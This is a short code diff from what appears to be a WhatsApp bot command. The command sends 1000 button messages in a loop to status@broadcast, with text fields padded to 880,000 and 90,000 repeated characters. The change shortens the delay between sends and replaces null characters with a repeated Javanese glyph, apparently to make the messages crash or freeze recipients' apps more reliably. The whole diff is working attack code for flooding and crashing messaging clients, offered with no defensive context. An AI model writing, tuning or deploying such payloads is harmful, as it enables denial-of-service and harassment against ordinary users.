@@ -17,7 +17,7 @@ export default {
     await m.reply(global.mess.spam);
     for (let i = 0; i < 1000; i++) {
       try {
-        await utils.sleep(500);
+        await utils.sleep(300);
         await sock.relayMessage(
           "status@broadcast",
           {
@@ -26,13 +26,13 @@ export default {
                 {
                   buttonId: "p",
                   buttonText: {
-                    displayText: `x${"\u0000".repeat(880000)}`,
+                    displayText: `x${"ꦾ".repeat(880000)}`,
                   },
                   type: 1,
                 },
               ],
               contentText: "content text",
-              text: `x${"\u0000".repeat(90000)}`,
+              text: `x${"ꦾ".repeat(90000)}`,
               headerType: 2,
             },
           },
